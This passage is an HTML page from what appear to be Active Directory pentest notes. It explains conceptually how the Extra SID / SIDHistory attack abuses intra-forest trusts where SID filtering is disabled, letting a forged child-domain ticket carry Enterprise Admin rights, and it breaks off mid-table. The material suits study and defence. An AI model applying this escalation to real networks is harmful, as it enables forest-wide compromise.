@@ -1,0 +1,2218 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Forest privilege escalation / trust abuse technique · AD Pentest Notes</title>
+<meta name="description" content="Forest-level escalation &amp; trust abuse: SID history, Extra SID, cross-forest golden tickets.">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<button class="menu-toggle" id="menuToggle" aria-label="Menu">☰</button>
+<div class="layout">
+<nav class="side-nav" id="sideNav">
+<a class="brand" href="index.html"><span class="brand-mark">AD</span><span class="brand-txt">Active Directory<br><small>Pentest Notes</small></span></a>
+<div class="nav-search"><input type="text" id="navSearch" placeholder="Search all notes…  (press /)" autocomplete="off"><div id="searchResults" class="search-results"></div></div>
+<a class="nav-home" href="index.html">🏠 Overview</a>
+<a class="nav-home" href="search.html">🔎 Full-text search</a>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>📘 Things To Understand Prior</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="00_things-to-understand-prior.html#ad-components">AD Components</a></li>
+<li><a href="00_things-to-understand-prior.html#active-directory-components">🧱 Active Directory Components</a></li>
+<li><a href="00_things-to-understand-prior.html#active-directory-structure">Active Directory Structure</a></li>
+<li><a href="00_things-to-understand-prior.html#example-of-domain-and-forest.">Example of Domain and Forest.</a></li>
+<li><a href="00_things-to-understand-prior.html#ad-authentication">AD Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#kerberos-authentication">Kerberos Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#step-by-step-kerberos-authentication">🔁 Step-by-Step Kerberos Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#pac-privilege-attribute-certificate">PAC (Privilege Attribute Certificate)</a></li>
+<li><a href="00_things-to-understand-prior.html#sam-security-system">Sam Security &amp;amp; System</a></li>
+<li><a href="00_things-to-understand-prior.html#lssas-lsa">Lssas &amp;amp; LSA</a></li>
+<li><a href="00_things-to-understand-prior.html#ntds.dit">NTDS.dit</a></li>
+<li><a href="00_things-to-understand-prior.html#dpapi-credential-manager">Dpapi ( Credential Manager )</a></li>
+<li><a href="00_things-to-understand-prior.html#ekeys">Ekeys</a></li>
+<li><a href="00_things-to-understand-prior.html#a.-pass-the-key-kerberos">✔ A. Pass-The-Key (Kerberos)</a></li>
+<li><a href="00_things-to-understand-prior.html#b.-pass-the-hash-ntlm">✔ B. Pass-The-Hash (NTLM)</a></li>
+<li><a href="00_things-to-understand-prior.html#c.-silver-ticket-forging">✔ C. Silver Ticket Forging</a></li>
+<li><a href="00_things-to-understand-prior.html#d.-persistence">✔ D. Persistence</a></li>
+<li><a href="00_things-to-understand-prior.html#rid-enumeration-deep-dive-core-logic-brute-force-working-user-enumeration">🔥 RID Enumeration — Deep Dive (Core Logic + Brute Force Working) + User Enumeration</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>⚔️ Attacks + Lateral Movement</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="01_attacks-lateral-movement.html#bloodhound">BloodHound</a></li>
+<li><a href="01_attacks-lateral-movement.html#local-admin-hunting">Local Admin Hunting</a></li>
+<li><a href="01_attacks-lateral-movement.html#llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</a></li>
+<li><a href="01_attacks-lateral-movement.html#objective">🔍 Objective</a></li>
+<li><a href="01_attacks-lateral-movement.html#overview">🧭 Overview</a></li>
+<li><a href="01_attacks-lateral-movement.html#purpose-of-llmnrnbt-ns">📦 Purpose of LLMNR/NBT-NS</a></li>
+<li><a href="01_attacks-lateral-movement.html#llmnr---link-local-multicast-name-resolution">🔗 LLMNR - Link-Local Multicast Name Resolution</a></li>
+<li><a href="01_attacks-lateral-movement.html#nbt-ns---netbios-name-service">📛 NBT-NS - NetBIOS Name Service</a></li>
+<li><a href="01_attacks-lateral-movement.html#security-flaw-in-both-protocols">🚨 Security Flaw in Both Protocols</a></li>
+<li><a href="01_attacks-lateral-movement.html#real-world-exploitation-workflow">🎯 Real-World Exploitation Workflow</a></li>
+<li><a href="01_attacks-lateral-movement.html#differences-between-llmnr-nbt-ns">🧠 Differences Between LLMNR &amp;amp; NBT-NS</a></li>
+<li><a href="01_attacks-lateral-movement.html#quick-example-llmnrnbt-ns-poisoning-flow-with-responder">🧪 Quick Example – LLMNR/NBT-NS Poisoning Flow (with Responder)</a></li>
+<li><a href="01_attacks-lateral-movement.html#summary-table">🧾 Summary Table</a></li>
+<li><a href="01_attacks-lateral-movement.html#defense-tips">🛡️ Defense Tips</a></li>
+<li><a href="01_attacks-lateral-movement.html#attack-flow-example">🧪 Attack Flow Example</a></li>
+<li><a href="01_attacks-lateral-movement.html#tools-used">🛠️ Tools Used</a></li>
+<li><a href="01_attacks-lateral-movement.html#responder-options-and-usage">⚙️ Responder Options and Usage</a></li>
+<li><a href="01_attacks-lateral-movement.html#responder-output-log-files">📁 Responder Output: Log Files</a></li>
+<li><a href="01_attacks-lateral-movement.html#cracking-captured-ntlmv2-hash-with-hashcat">🔓 Cracking Captured NTLMv2 Hash with Hashcat</a></li>
+<li><a href="01_attacks-lateral-movement.html#required-open-ports-on-attacker-system-for-responder">🧨 Required Open Ports on Attacker System (for Responder)</a></li>
+<li><a href="01_attacks-lateral-movement.html#use-cases-after-cracking-hashes">🪪 Use Cases After Cracking Hashes</a></li>
+<li><a href="01_attacks-lateral-movement.html#tips">🧠 Tips</a></li>
+<li><a href="01_attacks-lateral-movement.html#recap-of-flow">🔄 Recap of Flow</a></li>
+<li><a href="01_attacks-lateral-movement.html#attack-workflow-windows-inveigh-based-llmnrnbt-ns-poisoning">🚩 Attack Workflow (Windows Inveigh-Based LLMNR/NBT-NS Poisoning)</a></li>
+<li><a href="01_attacks-lateral-movement.html#sample-output-of-c-inveigh-cli-based">🧮 Sample Output of C# Inveigh (CLI-based)</a></li>
+<li><a href="01_attacks-lateral-movement.html#post-capture-actions">🧑‍💻 Post-Capture Actions</a></li>
+<li><a href="01_attacks-lateral-movement.html#remediation-mitigation">🔐 Remediation &amp;amp; Mitigation</a></li>
+<li><a href="01_attacks-lateral-movement.html#smb-ntml-relay-attacks">SMB / NTML Relay Attacks</a></li>
+<li><a href="01_attacks-lateral-movement.html#as-rep-roasting">AS-REP Roasting</a></li>
+<li><a href="01_attacks-lateral-movement.html#kerberoasting">Kerberoasting</a></li>
+<li><a href="01_attacks-lateral-movement.html#dcsync">DCSync</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-hash">Pass The Hash</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-ticket">Pass The Ticket</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-certificate">Pass The Certificate</a></li>
+<li><a href="01_attacks-lateral-movement.html#priv-esc---across-domain-trusts---ad-cs">Priv Esc - Across domain trusts - AD CS</a></li>
+<li><a href="01_attacks-lateral-movement.html#what-is-certify">🔧 What is Certify?</a></li>
+<li><a href="01_attacks-lateral-movement.html#summary-of-escalation-techniques-used">🔐 Summary of Escalation Techniques Used</a></li>
+<li><a href="01_attacks-lateral-movement.html#background-ad-cs-cross-domain-trust">🔥 BACKGROUND: AD CS + Cross-Domain Trust</a></li>
+<li><a href="01_attacks-lateral-movement.html#esc3-exploiting-certificate-request-agent-misconfiguration">🔓 ESC3 — Exploiting Certificate Request Agent Misconfiguration</a></li>
+<li><a href="01_attacks-lateral-movement.html#escalation-to-enterprise-admin-ea-same-concept">🔥 Escalation to Enterprise Admin (EA) (Same concept)</a></li>
+<li><a href="01_attacks-lateral-movement.html#esc1-enrollee-supplies-subject-misconfiguration">🔥 ESC1 — Enrollee Supplies Subject Misconfiguration</a></li>
+<li><a href="01_attacks-lateral-movement.html#step-by-step-guide">🧭 Step-by-Step Guide</a></li>
+<li><a href="01_attacks-lateral-movement.html#shadow-key-credentials-attack">Shadow Key Credentials Attack</a></li>
+<li><a href="01_attacks-lateral-movement.html#gmsa">GMSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#laps">LAPS</a></li>
+<li><a href="01_attacks-lateral-movement.html#where-is-the-laps-password-stored-1">💻 Where is the LAPS Password Stored?</a></li>
+<li><a href="01_attacks-lateral-movement.html#as-an-attacker-why-you-care">🔍 As an Attacker: Why You Care</a></li>
+<li><a href="01_attacks-lateral-movement.html#how-to-enumerate-laps">🧪 How to Enumerate LAPS</a></li>
+<li><a href="01_attacks-lateral-movement.html#unconstrained-delegation">Unconstrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#constrained-delegation">Constrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#what-the-kdc-checks">What the KDC Checks</a></li>
+<li><a href="01_attacks-lateral-movement.html#enumeration-of-constrained-delegation">🔍 Enumeration of Constrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#exploiting-with-rubeus">🧪 Exploiting with Rubeus</a></li>
+<li><a href="01_attacks-lateral-movement.html#bonus-abuse-via-alternate-services-altservice">⚠️ Bonus: Abuse via Alternate Services (altservice)</a></li>
+<li><a href="01_attacks-lateral-movement.html#defensive-notes">🔐 Defensive Notes</a></li>
+<li><a href="01_attacks-lateral-movement.html#rbcd">RBCD</a></li>
+<li><a href="01_attacks-lateral-movement.html#conditions-to-perform-the-attack">Conditions to Perform the Attack</a></li>
+<li><a href="01_attacks-lateral-movement.html#step-2-s4u2proxy-second-hop">6️⃣ Step 2: S4U2Proxy (Second Hop)</a></li>
+<li><a href="01_attacks-lateral-movement.html#rodc-golden-ticket-keylist-attack---extra">RODC = Golden Ticket + Keylist Attack - Extra</a></li>
+<li><a href="01_attacks-lateral-movement.html#root-cause">🔑 Root Cause</a></li>
+<li><a href="01_attacks-lateral-movement.html#trust-is-controlled-by">❗ Trust is Controlled By:</a></li>
+<li><a href="01_attacks-lateral-movement.html#you-broke-the-model-by">🔥 You Broke the Model By:</a></li>
+<li><a href="01_attacks-lateral-movement.html#bad-successor-dmsa-abuse">Bad Successor ( dMSA Abuse )</a></li>
+<li><a href="01_attacks-lateral-movement.html#reality">Reality</a></li>
+<li><a href="01_attacks-lateral-movement.html#these-accounts-usually-have">These Accounts Usually Have</a></li>
+<li><a href="01_attacks-lateral-movement.html#msa">MSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#gmsa-1">gMSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#dmsa">dMSA</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🔑 Permissions Abuse</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="02_permissions-abuse.html#dacl-sacl">DACL &amp;amp; SACL</a></li>
+<li><a href="02_permissions-abuse.html#genericwrite">🔐 GenericWrite</a></li>
+<li><a href="02_permissions-abuse.html#generic-all">Generic All</a></li>
+<li><a href="02_permissions-abuse.html#write-dacl">Write DACL</a></li>
+<li><a href="02_permissions-abuse.html#all-extended-rights">All Extended Rights</a></li>
+<li><a href="02_permissions-abuse.html#write-owner">Write Owner</a></li>
+<li><a href="02_permissions-abuse.html#ou-abuse">OU Abuse</a></li>
+<li><a href="02_permissions-abuse.html#genericall-write-on-ou">GenericAll / Write on OU</a></li>
+<li><a href="02_permissions-abuse.html#gpo-abuse">GPO Abuse</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🔒 Persistence</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="03_persistence.html#golden-ticket-attack">Golden Ticket Attack</a></li>
+<li><a href="03_persistence.html#how-the-golden-ticket-attack-works-step-by-step">🔧 How the Golden Ticket Attack Works (Step-by-Step)</a></li>
+<li><a href="03_persistence.html#what-if-we-impersonate-a-non-existing-user">What if we impersonate a non-existing user?</a></li>
+<li><a href="03_persistence.html#step-1-obtain-the-krbtgt-hash">🔑 Step 1 — Obtain the krbtgt Hash</a></li>
+<li><a href="03_persistence.html#method-1-using-dcsync-most-common">Method 1 — Using DCSync (Most Common)</a></li>
+<li><a href="03_persistence.html#diamond-ticket-attack">Diamond Ticket Attack</a></li>
+<li><a href="03_persistence.html#sliver-ticket-attack">Sliver Ticket Attack</a></li>
+<li><a href="03_persistence.html#what-is-a-silver-ticket-attack">🚀 What is a Silver Ticket Attack?</a></li>
+<li><a href="03_persistence.html#step-by-step-exploitation">⚔️ Step-by-Step Exploitation</a></li>
+<li><a href="03_persistence.html#difference-between-golden-silver-diamond">Difference Between Golden Silver &amp;amp; Diamond</a></li>
+<li><a href="03_persistence.html#persistence-using-acl--adminsdholder---domain-persistence">Persistence using ACL -AdminSDHolder - Domain Persistence</a></li>
+<li><a href="03_persistence.html#dsrm-attack---domain-persistence">DSRM Attack - Domain Persistence</a></li>
+<li><a href="03_persistence.html#skeleton-key-attack">Skeleton Key Attack</a></li>
+</ul></div>
+<div class="nav-group open">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🌲 Forest privilege escalation / trust abuse technique</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#golden-ticket-attack-sid-prime-attack">Golden Ticket Attack + SID Prime Attack</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#extra-sid-attack">Extra Sid Attack</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#alternative-golden-ticket-via-rubeus">🧪 Alternative: Golden Ticket via Rubeus</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#step-8-dcsync-from-parent-domain-privilege-confirm">📤 Step 8: DCSync from Parent Domain (Privilege Confirm)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🖥️ TI interne</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="05_ti-interne.html#ère-étape-découverte-réseau">1ère étape – Découverte réseau</a></li>
+<li><a href="05_ti-interne.html#bloodhound">BloodHound</a></li>
+<li><a href="05_ti-interne.html#enum-acl">Enum ACL</a></li>
+<li><a href="05_ti-interne.html#énumération-ldap">Énumération LDAP</a></li>
+<li><a href="05_ti-interne.html#domain-computers-abus-machineaccountquota">Domain computers (abus MachineAccountQuota)</a></li>
+<li><a href="05_ti-interne.html#ipc-null-session-enumération-sid">IPC$ / null session → enumération SID</a></li>
+<li><a href="05_ti-interne.html#kerberoasting-aveugle-blind-kerberoast">Kerberoasting aveugle (blind kerberoast)</a></li>
+<li><a href="05_ti-interne.html#exploit-krb5.keytab">Exploit krb5.keytab</a></li>
+<li><a href="05_ti-interne.html#force-change-password">Force Change Password</a></li>
+<li><a href="05_ti-interne.html#generic-all-abus-complet-sur-un-objet">Generic All (abus complet sur un objet)</a></li>
+<li><a href="05_ti-interne.html#genericwrite-targeted-kerberoast-shadow-credentials">GenericWrite → Targeted Kerberoast / Shadow Credentials</a></li>
+<li><a href="05_ti-interne.html#backup-operators-locally">Backup Operators (locally)</a></li>
+<li><a href="05_ti-interne.html#templates-ad-cs-rappel">Templates AD CS (rappel)</a></li>
+<li><a href="05_ti-interne.html#ad-cs-énumération-et-exploitation-esc1-esc8">AD CS – Énumération et exploitation (ESC1 → ESC8)</a></li>
+<li><a href="05_ti-interne.html#gpo-abuse-privilege-escalation">GPO Abuse – Privilege Escalation</a></li>
+<li><a href="05_ti-interne.html#pass-the-hash-pth">Pass the Hash (PtH)</a></li>
+<li><a href="05_ti-interne.html#psexec">PSExec</a></li>
+<li><a href="05_ti-interne.html#smb-sans-signature-relais">SMB sans signature (relais)</a></li>
+<li><a href="05_ti-interne.html#ntlm-theft">NTLM theft</a></li>
+<li><a href="05_ti-interne.html#password-spraying-ntlm-http">Password Spraying (NTLM HTTP)</a></li>
+<li><a href="05_ti-interne.html#reverse-shell-windows-msfvenom-smb">Reverse shell Windows (msfvenom + SMB)</a></li>
+<li><a href="05_ti-interne.html#exfiltration-canaux-variés">Exfiltration (canaux variés)</a></li>
+<li><a href="05_ti-interne.html#évasion-av-powercat-download-cradle">Évasion AV (powercat / download-cradle)</a></li>
+<li><a href="05_ti-interne.html#génération-de-listes-dutilisateurs">Génération de listes d’utilisateurs</a></li>
+<li><a href="05_ti-interne.html#windows-privesc-résumé-des-vecteurs">Windows PrivEsc (résumé des vecteurs)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🌐 Pentest web</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="06_pentest-web.html#énumération">Énumération</a></li>
+<li><a href="06_pentest-web.html#apache-2.4.49-path-traversal-rce-cve-2021-41773">Apache 2.4.49 – Path Traversal / RCE (CVE-2021-41773)</a></li>
+<li><a href="06_pentest-web.html#php-wrappers-lfi">PHP wrappers / LFI</a></li>
+<li><a href="06_pentest-web.html#tomcat-war-reverse-shell">Tomcat – WAR reverse shell</a></li>
+<li><a href="06_pentest-web.html#bypass-auth-brute-force">Bypass auth – Brute force</a></li>
+<li><a href="06_pentest-web.html#cms">CMS</a></li>
+<li><a href="06_pentest-web.html#code-injection-payloads">Code injection – Payloads</a></li>
+<li><a href="06_pentest-web.html#ssti">SSTI</a></li>
+<li><a href="06_pentest-web.html#sql-injection">SQL Injection</a></li>
+<li><a href="06_pentest-web.html#nosql-injection">NoSQL Injection</a></li>
+<li><a href="06_pentest-web.html#xxe">XXE</a></li>
+<li><a href="06_pentest-web.html#xss">XSS</a></li>
+<li><a href="06_pentest-web.html#csrf-payloads">CSRF – Payloads</a></li>
+<li><a href="06_pentest-web.html#node.js-reverse-shell-deserialization">Node.js – Reverse shell (deserialization)</a></li>
+<li><a href="06_pentest-web.html#php-hmac">PHP – HMAC</a></li>
+<li><a href="06_pentest-web.html#docker-registry-enumération-via-curl">Docker registry – Enumération via curl</a></li>
+<li><a href="06_pentest-web.html#outils">Outils</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>☁️ Cloud &amp; K8s</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="07_cloud-k8s.html#docker-bases">Docker (bases)</a></li>
+<li><a href="07_cloud-k8s.html#kubernetes-kube">Kubernetes (Kube)</a></li>
+<li><a href="07_cloud-k8s.html#azure-cli-devops">Azure CLI (DevOps)</a></li>
+<li><a href="07_cloud-k8s.html#scénarios-dattaque-azure-devops-ci-cd">Scénarios d’attaque Azure DevOps / CI-CD</a></li>
+<li><a href="07_cloud-k8s.html#terraform-state-file-prise-de-contrôle-pipeline-study-case">Terraform state file → prise de contrôle pipeline (study case)</a></li>
+<li><a href="07_cloud-k8s.html#détection-de-vulnérabilités-iac-checkov-terra">Détection de vulnérabilités IaC (Checkov / Terra)</a></li>
+<li><a href="07_cloud-k8s.html#llm-prompt-injection">LLM (prompt injection)</a></li>
+<li><a href="07_cloud-k8s.html#owasp-top-10-cicd-security-risks">OWASP Top 10 CI/CD Security Risks</a></li>
+<li><a href="07_cloud-k8s.html#outils-daudit-k8s-cloud">Outils d’audit K8s / Cloud</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🧰 Priv escalation &amp; Tools</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="08_privesc-tools.html#linux-privesc">Linux PrivEsc</a></li>
+<li><a href="08_privesc-tools.html#reverse-shells">Reverse shells</a></li>
+<li><a href="08_privesc-tools.html#upgrade-shell-tty">Upgrade shell (TTY)</a></li>
+<li><a href="08_privesc-tools.html#pivoting-rpivot">Pivoting (rpivot)</a></li>
+<li><a href="08_privesc-tools.html#port-knocking">Port knocking</a></li>
+<li><a href="08_privesc-tools.html#python-jail-escape">Python jail escape</a></li>
+<li><a href="08_privesc-tools.html#insecure-deserialization-php">Insecure deserialization (PHP)</a></li>
+<li><a href="08_privesc-tools.html#bypass-command-line-obfuscation">Bypass command line (obfuscation)</a></li>
+<li><a href="08_privesc-tools.html#john-the-ripper">John the Ripper</a></li>
+<li><a href="08_privesc-tools.html#tls">TLS</a></li>
+<li><a href="08_privesc-tools.html#wayback-recon-passif">Wayback / recon passif</a></li>
+<li><a href="08_privesc-tools.html#google-dorks-extraits">Google Dorks (extraits)</a></li>
+<li><a href="08_privesc-tools.html#boîte-à-outils-tools">Boîte à outils (TOOLS)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>✅ Web Vulnerability Checklist</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="09_web-vuln-checklist.html#fa-bypass">2FA Bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#bypass">403 Bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#account-takeover-ato">Account Takeover (ATO)</a></li>
+<li><a href="09_web-vuln-checklist.html#admin-panel">Admin panel</a></li>
+<li><a href="09_web-vuln-checklist.html#aem-adobe-experience-manager">AEM (Adobe Experience Manager)</a></li>
+<li><a href="09_web-vuln-checklist.html#api-authentication-authorization">API Authentication / Authorization</a></li>
+<li><a href="09_web-vuln-checklist.html#authentication">Authentication</a></li>
+<li><a href="09_web-vuln-checklist.html#business-logic">Business Logic</a></li>
+<li><a href="09_web-vuln-checklist.html#cookie-attacks">Cookie Attacks</a></li>
+<li><a href="09_web-vuln-checklist.html#csrf">CSRF</a></li>
+<li><a href="09_web-vuln-checklist.html#exif-geolocation">EXIF / Geolocation</a></li>
+<li><a href="09_web-vuln-checklist.html#file-upload">File Upload</a></li>
+<li><a href="09_web-vuln-checklist.html#django-symfony">Django / Symfony</a></li>
+<li><a href="09_web-vuln-checklist.html#idor">IDOR</a></li>
+<li><a href="09_web-vuln-checklist.html#jira">Jira</a></li>
+<li><a href="09_web-vuln-checklist.html#mass-assignment">Mass Assignment</a></li>
+<li><a href="09_web-vuln-checklist.html#rate-limit-bypass">Rate limit bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#rce-chaînes">RCE (chaînes)</a></li>
+<li><a href="09_web-vuln-checklist.html#register">Register</a></li>
+<li><a href="09_web-vuln-checklist.html#reset-password">Reset password</a></li>
+<li><a href="09_web-vuln-checklist.html#rxss">RXSS</a></li>
+<li><a href="09_web-vuln-checklist.html#sql-injection-payloads">SQL injection (payloads)</a></li>
+<li><a href="09_web-vuln-checklist.html#tips-twitterveille">Tips (Twitter/veille)</a></li>
+</ul></div>
+</nav>
+<main class="content">
+
+<div class="page-head">
+  <div class="crumb"><a href="index.html">Notes</a> ›</div>
+  <h1 class="page-title">🌲 Forest privilege escalation / trust abuse technique</h1>
+  <p class="page-desc">Forest-level escalation &amp; trust abuse: SID history, Extra SID, cross-forest golden tickets.</p>
+</div>
+<div class="article-wrap">
+  <article class="article"><h1 id="forest-privilege-escalation-trust-abuse-technique">Forest privilege escalation / trust abuse technique</h1>
+<h2 id="golden-ticket-attack-sid-prime-attack">Golden Ticket Attack + SID Prime Attack</h2>
+<h3 id="understanding-sid-history-injection-attack">Understanding SID History Injection Attack</h3>
+<h3 id="what-is-extra-sid">What is Extra SID?</h3>
+<p><strong>Extra SID = Additional group identities added to your PAC that you don’t normally belong to.</strong></p>
+<p>An <strong>Extra SID Attack</strong> is a Kerberos ticket forgery technique where an attacker inserts additional privileged SIDs into the <strong>ExtraSIDs/SIDHistory</strong> section of the PAC to gain permissions that the user does not legitimately possess.</p>
+<h3 id="core-concept-why-this-attack-works">📘 Core Concept: Why This Attack Works</h3>
+<p>This attack works because of <strong>three Active Directory design behaviors</strong>:</p>
+<div class="line-block">Concept | Explanation |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>Kerberos tickets carry authorization data</strong> | Group SIDs are embedded inside the TGT |</div>
+<div class="line-block"><strong>SIDHistory allows cross-domain authorization</strong> | Old SIDs remain valid after migration |</div>
+<div class="line-block"><strong>Intra-forest trusts disable SID filtering by default</strong> | Parent domain accepts SIDs from child domain |</div>
+<p>Because of these:</p>
+<pre><code>
+Attacker controls child domain
+
+        │
+
+        ▼
+
+Attacker forges a TGT
+
+        │
+
+        ▼
+
+Adds parent domain privileged SID
+
+        │
+
+        ▼
+
+Parent domain trusts the SID
+
+        │
+
+        ▼
+
+Attacker gains forest-level privileges
+</code></pre>
+<h3 id="what-domain-trust-means-in-active-directory">1️⃣ What “Domain Trust” Means in Active Directory</h3>
+<p>When two domains trust each other, it means:</p>
+<pre><code>
+Users from Domain A
+
+can access resources in
+
+Domain B
+</code></pre>
+<p>The <strong>Domain Controller (DC)</strong> in Domain B will accept authentication from Domain A.</p>
+<p>Example:</p>
+<pre><code>
+User: alice@LOGISTICS.INLANEFREIGHT.LOCAL
+
+tries to access
+
+Server: FILE01.INLANEFREIGHT.LOCAL
+</code></pre>
+<p>Flow:</p>
+<pre><code>
+LOGISTICS DC → authenticates Alice
+
+        │
+
+        ▼
+
+Parent DC trusts LOGISTICS
+
+        │
+
+        ▼
+
+Access decision made
+</code></pre>
+<hr />
+<h3 id="trusts-inside-an-ad-forest">2️⃣ Trusts Inside an AD Forest</h3>
+<p>Inside a forest, trusts are <strong>created automatically when a domain is added</strong>.</p>
+<p>Example forest:</p>
+<pre><code>
+INLANEFREIGHT.LOCAL (Root Domain)
+
+        │
+
+        ├── LOGISTICS.INLANEFREIGHT.LOCAL
+
+        ├── HR.INLANEFREIGHT.LOCAL
+
+        └── IT.INLANEFREIGHT.LOCAL
+</code></pre>
+<p>When <strong>LOGISTICS</strong> is created:</p>
+<pre><code>
+Trust automatically created with parent
+</code></pre>
+<p><strong>Trust properties</strong></p>
+<p>These trusts are:</p>
+<div class="line-block">Property | Meaning |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>Two-way</strong> | Both domains trust each other |</div>
+<div class="line-block"><strong>Transitive</strong> | Trust extends across forest |</div>
+<div class="line-block"><strong>Automatic</strong> | Created by AD automatically |</div>
+<p>Example:</p>
+<pre><code>
+HR trusts LOGISTICS
+
+LOGISTICS trusts IT
+
+IT trusts HR
+</code></pre>
+<p>because the trust is <strong>transitive</strong>.</p>
+<h3 id="understanding-sid-and-authorization">🔑 Understanding SID and Authorization</h3>
+<p>Every AD object has a <strong>SID</strong>.</p>
+<p>Example:</p>
+<pre><code>
+User SID
+
+S-1-5-21-2806153819-209893948-922872689-1105
+</code></pre>
+<p>Group membership adds <strong>additional SIDs</strong>.</p>
+<p>Example token:</p>
+<pre><code>
+User SID
+
+Domain Users
+
+Domain Admins
+
+Enterprise Admins
+</code></pre>
+<p>When accessing resources:</p>
+<pre><code>
+Windows checks → Access Token SIDs
+</code></pre>
+<p>NOT the username.</p>
+<p>This is extremely important.</p>
+<pre><code>
+Authorization = SID based
+
+NOT username based
+</code></pre>
+<h3 id="why-sid-filtering-exists">3️⃣ Why SID Filtering Exists</h3>
+<p>Remember that <strong>authorization in Windows is SID-based</strong>.</p>
+<p>Example access token:</p>
+<pre><code>
+User SID
+
+Domain Users SID
+
+Domain Admin SID
+
+Enterprise Admin SID
+</code></pre>
+<p>If an attacker could simply <strong>add any SID</strong>, they could escalate privileges.</p>
+<p>Example forged token:</p>
+<pre><code>
+User: hacker
+
+SIDs:
+
+  Domain Users
+
+  Enterprise Admins
+</code></pre>
+<p>Without protection, this would grant <strong>forest-level privileges</strong>.</p>
+<hr />
+<h3 id="sid-filtering-protection">4️⃣ SID Filtering Protection</h3>
+<p>To prevent this, Microsoft introduced <strong>SID Filtering</strong>.</p>
+<p>SID filtering means:</p>
+<pre><code>
+When a domain receives authentication from another domain
+
+it removes SIDs that do not belong to the trusted domain
+</code></pre>
+<p>Example:</p>
+<p>User authenticates from Domain A.</p>
+<p>Token contains:</p>
+<pre><code>
+Domain A SID
+
+Enterprise Admin SID from Domain B
+</code></pre>
+<p>With SID filtering enabled:</p>
+<pre><code>
+Domain B removes foreign SID
+</code></pre>
+<p>Result:</p>
+<pre><code>
+Enterprise Admin SID removed
+</code></pre>
+<p>Attack fails.</p>
+<h3 id="why-sid-filtering-is-disabled-inside-a-forest">5️⃣ Why SID Filtering Is Disabled Inside a Forest</h3>
+<p>Inside the same forest, Microsoft <strong>disabled SID filtering by default</strong>.</p>
+<p>Reason: <strong>migration compatibility</strong>.</p>
+<p>Example scenario:</p>
+<p>A company merges two domains.</p>
+<p>User migration happens:</p>
+<pre><code>
+Old domain → NEWDOMAIN
+</code></pre>
+<p>User receives new SID:</p>
+<pre><code>
+S-1-5-21-NEWDOMAIN-1105
+</code></pre>
+<p>But old resources still use old SID:</p>
+<pre><code>
+S-1-5-21-OLDDOMAIN-1105
+</code></pre>
+<p>So AD stores:</p>
+<pre><code>
+sidHistory = old SID
+</code></pre>
+<p>When the user logs in:</p>
+<pre><code>
+Access Token contains
+
+Primary SID
+
++ SIDHistory
+</code></pre>
+<p>If SID filtering were enabled:</p>
+<pre><code>
+Old SID removed
+</code></pre>
+<p>User would lose access to migrated resources.</p>
+<p>So Microsoft decided:</p>
+<pre><code>
+Within same forest → allow SIDHistory
+</code></pre>
+<p>Which means:</p>
+<pre><code>
+SID filtering disabled
+</code></pre>
+<h3 id="which-trusts-allow-the-extrasid-attack">6️⃣ Which Trusts Allow the ExtraSID Attack</h3>
+<p>The attack works <strong>only when SID filtering is not enforced</strong>.</p>
+<p><strong>✔️ Attack Works</strong></p>
+<div class="line-block">Trust Type | SID Filtering | Attack |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block">Intra-forest parent-child | Disabled | Possible |</div>
